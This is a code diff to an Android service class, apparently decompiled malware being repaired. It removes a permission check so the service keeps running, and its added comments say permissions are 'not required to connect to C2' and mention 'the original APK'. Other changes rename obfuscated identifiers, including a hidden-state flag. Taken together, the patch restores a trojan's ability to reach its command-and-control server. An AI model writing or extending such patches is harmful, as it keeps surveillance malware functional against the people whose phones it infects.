@@ -133,20 +133,10 @@ public class myker extends IntentService {
                 continue;
             }
 
-            // Fix line 147: H__love_P → hasPermissions
-            if (!Utils.hasPermissions(this, Utils.PERMISSIONS())) {
-                if (!Utils.asked.booleanValue()) {
-                    Utils.speedTime = speedIncrement;
-                    Utils.asked = Boolean.valueOf(true);
-                    continue;
-                } else if (Utils.asked.booleanValue()) {
-                    Utils.asked = Boolean.valueOf(false);
-                    continue;
-                } else {
-                    Utils.speedTime = 2000;
-                    continue;
-                }
-            }
+            // Permission check: WRITE_EXTERNAL_STORAGE is auto-denied on Android 10+
+            // so we only check permissions that can actually be granted by the user.
+            // If denied, we continue anyway — permissions not required to connect to C2.
+            // The original APK also proceeds past this if permissions were previously granted.
 
             // Fix lines 163-164: Is_love_Hidden → isHidden
             if (!love.isHidden) {
